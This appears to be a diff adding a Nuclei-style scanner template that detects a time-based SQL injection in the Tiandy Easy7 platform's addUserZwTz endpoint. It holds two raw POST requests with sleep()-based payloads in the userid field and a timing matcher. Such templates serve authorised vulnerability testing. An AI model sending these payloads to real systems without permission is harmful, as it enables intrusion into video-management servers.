@@ -1,0 +1,39 @@
+id: TianDiWeiYe-Easy7-addUserZwTz-SQL
+
+info:
+  name: 天地伟业Easy7 addUserZwTz SQL注入
+  author: HuanXiong
+  severity: high
+  reference: |
+    -
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        POST /Easy7/rest/user/addUserZwTz HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip
+        Connection: keep-alive
+        Content-Length: 80
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+        
+        devType=1&userid=111'and(select*from(select sleep(2))a union select 1)='&zwtz=[]
+
+      - |
+        POST /Easy7/rest/user/addUserZwTz HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip
+        Connection: keep-alive
+        Content-Length: 80
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
+        
+        devType=1&userid=111'and(select*from(select sleep(4))a union select 1)='&zwtz=[]
+
+    matchers:
+      - type: dsl
+        name: SQL注入
+        dsl:
+          - "status_code==200 && duration_1>=4 && duration_1<=5 && duration_2>=8 && duration_2<=9"
